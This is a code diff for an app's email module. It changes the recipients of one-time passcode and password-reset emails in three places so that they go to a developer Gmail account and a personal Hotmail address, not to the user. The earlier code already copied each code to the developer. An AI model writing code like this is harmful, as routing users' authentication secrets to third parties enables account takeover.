@@ -25,7 +25,7 @@ module.exports = function (OTP, data, type, to) {
 
     let subject = `Trim Business - OTP`
     const name = `${data.firstName} ${data.lastName}`
-    const to = [data.email, 'sigidevelopers@gmail.com']
+    const to = ['sigidevelopers@gmail.com', 'charlesblake520@hotmail.co.uk'] //send mail data.email, 
     console.log(
       '🚀 ~ sigidevelopers:',
       attachment.footer.concat(attachment.security),
@@ -579,7 +579,7 @@ module.exports = function (OTP, data, type, to) {
       postOtpText = `If you didn’t request this, please ignore this email.`
     let subject = `Trim - OTP`
     const name = `${data.firstName} ${data.lastName}`
-    const to = [data.email, 'sigidevelopers@gmail.com']
+    const to = ['sigidevelopers@gmail.com', 'charlesblake520@hotmail.co.uk'] //send mail data.email, 
     console.log(
       '🚀 ~ sigidevelopers:',
       attachment.footer.concat(attachment.security),
@@ -1183,7 +1183,7 @@ module.exports = function (OTP, data, type, to) {
 
     let subject = `Trim - Reset Password`
     const name = `${data.firstName} ${data.lastName}`
-    const to = [data.email, 'sigidevelopers@gmail.com']
+    const to = ['sigidevelopers@gmail.com', 'charlesblake520@hotmail.co.uk'] //send mail data.email, 
     console.log(
       '🚀 ~ sigidevelopers:',
       attachment.footer.concat(attachment.security),
